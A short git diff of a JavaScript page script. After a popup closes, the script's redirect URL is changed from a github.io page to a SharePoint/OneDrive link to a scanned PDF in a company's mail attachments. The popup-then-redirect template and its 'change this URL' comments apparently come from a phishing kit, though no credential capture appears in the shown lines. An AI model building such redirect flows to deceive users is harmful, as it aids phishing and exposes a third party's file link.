@@ -528,7 +528,7 @@ document.addEventListener('DOMContentLoaded', function() {
         closePopup();
         
         // Define the redirect URL (you can change this to any URL you want)
-        const redirectUrl = 'https://limsincenturial.github.io/cavinkarecentrial/'; // Change this URL
+        const redirectUrl = 'https://brownbrothersnz-my.sharepoint.com/personal/office_brownbrothers_net_nz/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Foffice%5Fbrownbrothers%5Fnet%5Fnz%2FDocuments%2FAttachments%2FScan%5F20260421%20%2813%29%2Epdf&parent=%2Fpersonal%2Foffice%5Fbrownbrothers%5Fnet%5Fnz%2FDocuments%2FAttachments&ct=1777341778172&or=OWA%2DNT%2DMail&cid=3ac29c70%2Dda8c%2D2aaf%2D6cf7%2Da3ad5132c628&ga=1'; // Change this URL
         
         console.log('Redirecting to:', redirectUrl);
         
